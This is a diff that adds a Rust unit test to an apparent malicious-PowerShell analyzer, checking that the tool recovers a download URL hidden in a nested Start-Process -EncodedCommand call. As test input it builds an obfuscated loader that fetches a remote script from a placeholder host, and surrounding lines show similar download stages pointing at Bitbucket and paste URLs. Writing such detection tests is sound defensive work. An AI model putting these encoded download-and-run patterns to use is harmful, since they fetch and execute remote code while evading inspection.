@@ -12039,6 +12039,31 @@ Invoke-WebRequest -Uri $k[0] -OutFile stage.bin
     }
 
     #[test]
+    fn nested_start_process_argumentlist_variable_array_ref_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-var-array-ref.example/p.ps1";
+        let ps = format!(
+            r#"$payload = '{}'; $args = @('-NoP', '-EncodedCommand', $payload); Start-Process powershell.exe -ArgumentList $args"#,
+            encode_utf16(decoded)
+        );
+        let script = format!("powershell -Command \"{}\"\r\n", ps.replace('"', "\\\""));
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://start-var-array-ref.example/p.ps1"
+                )
+            }),
+            "nested Start-Process ArgumentList variable array ref EncodedCommand URL missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
     fn damaged_powershell_handoff_regex_replaced_b64_chain_resolves_urls() {
         let decoded = r#"
 $links = @('https://bitbucket.org/team/repo/downloads/3.jpg','https://paste.sensio.no/ApartAirways')
